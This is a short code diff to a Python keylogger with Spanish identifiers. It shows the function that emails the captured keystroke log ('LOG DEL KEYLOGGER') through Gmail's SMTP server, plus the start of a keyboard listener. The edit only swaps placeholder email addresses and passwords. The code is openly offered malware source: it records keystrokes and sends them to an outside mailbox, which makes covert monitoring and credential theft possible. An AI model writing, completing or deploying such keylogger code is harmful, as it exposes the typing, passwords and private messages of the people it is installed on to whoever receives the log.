@@ -6,8 +6,8 @@ import sys
 
 def enviar_correo():
     mensaje = MIMEMultipart("plain")
-    mensaje["From"] = "example@gmail.com"
-    mensaje["To"] = "example_from@gmail.com"
+    mensaje["From"] = "tucorreo@gmail.com"
+    mensaje["To"] = "destinatario@gmail.com"
     mensaje["Subject"] = "LOG DEL KEYLOGGER"
 
     adjunto = MIMEBase("application","octect-stream")
@@ -17,11 +17,10 @@ def enviar_correo():
 
     server = SMTP("smtp.gmail.com:587")
     server.starttls()
-    server.login("example@gmail.com","1234 5678 1234 5678")
-    server.sendmail("example_from@gmail.com","example@gmail.com",mensaje.as_string().encode('utf-8'))
+    server.login("tucorreo@gmail.com", "tu_contraseña")
+    server.sendmail("tucorreo@gmail.com", "destinatario@gmail.com", mensaje.as_string().encode('utf-8'))
 
     server.quit
-    
     
 def keyboard_listener(key):
     etter = str(key)
